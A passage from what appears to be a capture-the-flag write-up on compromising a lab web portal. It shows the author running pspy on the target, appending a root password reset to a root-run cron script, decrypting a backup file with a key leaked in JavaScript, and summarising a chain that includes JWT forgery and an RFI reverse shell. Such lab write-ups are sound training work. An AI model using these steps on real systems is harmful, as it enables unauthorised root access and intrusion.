/var/www/html/static
/var/www/html/backup
/var/www/html/support
/var/www/html/api
/var/www/html/api/users
/var/www/html/api/auth
```

From the list above, the `/opt` looks promising:

```bash
find /opt -writable -type f 2>/dev/null
/opt/monitoring/health_report.sh
/opt/admin_bot.py
```

> [!Note] Note
> `/opt/admin_bot.py` ties back to Challenge 3 This is the "reviewer" that flips tickets from Pending -> Reviewed and is the target of the `create.php` stored-XSS path we did **not** use for RCE. Finding it here confirms the ticket feature was a side-path, not our RCE route.
## Using pspy
- **Download the pspy from github** on the attack box (https://github.com/DominicBreuker/pspy/releases).

```bash
# Execute on the attack box
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

- **host it on the attack box and download it from the target machine** (use the `python3 -m http.server 80` command on the attack box to start an HTTP server)
- **Download the file from the target machine**:

```bash
# Execute on the target machine's CLI
wget http://10.112.126.205/pspy64
```

- **execute it**

```bash
# Run these commands on the target machine's CLI
chmod u+x pspy64
./pspy64
```

**Observation**: The `/opt/monitoring/health_report.sh` is executed every minute as **root** (UID=0). The user `devops` has write permission to this file. This is a good opportunity to try to perform privilege escalation.

```
2026/11/01 21:30:01 CMD: UID=0     PID=5243   | /bin/bash /opt/monitoring/health_report.sh 
2026/11/01 21:31:01 CMD: UID=0     PID=5254   | /bin/bash /opt/monitoring/health_report.sh 
2026/11/01 21:32:01 CMD: UID=0     PID=5264   | /bin/bash /opt/monitoring/health_report.sh 
```

## Privilege escalation
- Edit the file `/opt/monitoring/health_report.sh` and append a payload. Because the script runs as root every minute, our appended line runs as root. We reset root's password here (loud but effective on a CTF; quieter alternatives would be adding an SSH key to `/root/.ssh/authorized_keys` or dropping a SUID bash):

```bash
# Execute this on the target machine CLI (single quotes keep the pipe/quotes literal)
echo 'echo "root:test1234" | chpasswd' >> /opt/monitoring/health_report.sh
```

- wait a minute or so till the file is executed
- attempt to escalate to root

```bash
su - root
Password: 
```

```bash
whoami
root
```

BINGO! we are root. let's get the last flag.

```bash
pwd
/root
```

```bash
ls -ltr
total 8
drwxr-xr-x 4 root root 4096 Oct 22  2024 snap
-rw------- 1 root root   29 Apr 29  2026 root.txt
```

```bash
cat root.txt 
THM{pr1v3sc_....}
```

# Backup file (documented dead-end)
When searching for files and directories, there was a `backup` directory. Maybe there is a clue there:

```bash
http://10.112.167.102/  [200]
├── backup/  [301, -> /backup/]
│   ├── config.enc  [200]
│   └── README.txt  [200]
```

Read the contents of the `README.txt` file:

```bash
curl $URL/backup/README.txt
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

Download the file:

```bash
curl -s $URL/backup/config.enc -o config.enc
```

The content is encrypted with AES-128-ECB:

```bash
cat config.enc 
1�u�4]@K`���ۦ��qˌ"���~Ps�s��i�ɮ��(܋����PK�Gy^�h�ҲA-\��vt��b��/װ�1Wm�Z�%A��v���6+d�O�}a
```

download the `static/app.js` file as instructed in the `README.txt` file:

```bash
curl  $URL/static/app.js -o app.js
```

```bash
cat app.js 
// NexusCorp Portal - Frontend Utilities
// v2.3.1 - Build 20241115

(function() {
    'use strict';

    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: <Password goes here>  (pad to 16 bytes with )
        _backupKey: '<Password goes here>',
        appVersion: '2.3.1'
    };
    // ... session helpers omitted ...
})();
```

BINGO! There is a key in the client-side JavaScript. `_backupKey: '<Password goes here>'

> [!Info] The real lesson (even though the plaintext is a decoy)
>Two genuine weaknesses are on display, regardless of the payload: 
>- (1) a **secret key committed into client-side JS** (`static/app.js`) that anyone can download, and 
>- (2) **AES-128-ECB**, which is a weak mode (it leaks structure and reuses the same ciphertext for identical plaintext blocks). Worth noting as findings even though the decrypted content turned out to be bait.

```bash
KEY=$(printf '%s' '<redacted>' | xxd -p | tr -d '\n')
KEY=$(printf '%-32s' "$KEY" | tr ' ' '0')
echo $KEY
openssl enc -d -aes-128-ecb -K "$KEY" -in config.enc -out config.dec
```

**contents of the decrypted file**

```bash
cat config.dec 
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

This is not useful and most likely a decoy to distract us.

# Methodology (the full chain)
1. **Username harvesting** - scrape `team.php` -> 7 `firstname.lastname` usernames.
2. **Broken password reset** - `api/reset.php` returns the reset token in the HTTP response -> reset `james.wright` -> log in.
3. **IDOR** - `api/users/profile.php?id=` has no ownership check -> **Flag 1** (laura.hayes notes) and discover the real admin is `laura.hayes`.
4. **JWT forgery** - `verify_jwt()` has its signature check disabled -> forge an admin JWT -> admin panel -> **Flag 2**.
5. **File read -> RFI** - `files.php?name=` reads arbitrary paths (source leak of `reset.php`/`auth.php`/`config.php`) and, crucially, fetches + `eval`s remote URLs -> host a PHP reverse shell -> **RCE as www-data** -> **Flag 3**.
    - _Side path:_ `create.php` + `admin_bot.py` -> SSRF that leaks laura.hayes's admin cookie (and `APP_SECRET`), an alternative route to the admin panel / **Flag 2**.
6. **Credential reuse** - `config.php` `DB_PASS` reused -> `su devops` -> **Flag 4**.
7. **Writable root cron** - `/opt/monitoring/health_report.sh` runs as root every minute and is `devops`-writable -> append payload -> **root** -> **Flag 5**.

# Roads not taken / decoys
- **Cookie forgery** - looked doomed at Challenge 2 (HMAC checked _and_ role re-read from DB in `auth.php`), but `admin_bot.py` later leaked `APP_SECRET = <password goes here>`. With that key the cookie _is_ forgeable offline - the road re-opened once we read the bot.
- **Support-ticket "XSS"** - advertised by the source comment and the `bl1nd_x55` flag name, but the reviewer is a `requests` client, not a browser. The real bug is **SSRF**: the bot fetches ticket URLs with laura's admin cookie, which we capture (see Challenge 3). Not the RCE path, but it independently yields admin (Flag 2).
- **`backup/config.enc`** - AES-128-ECB with a key leaked in `app.js`; decrypts to a decoy. Still worth citing as two genuine findings (secret-in-client-JS, weak ECB mode).
- **Brute force** - avoided throughout; the logic flaws were always the intended path.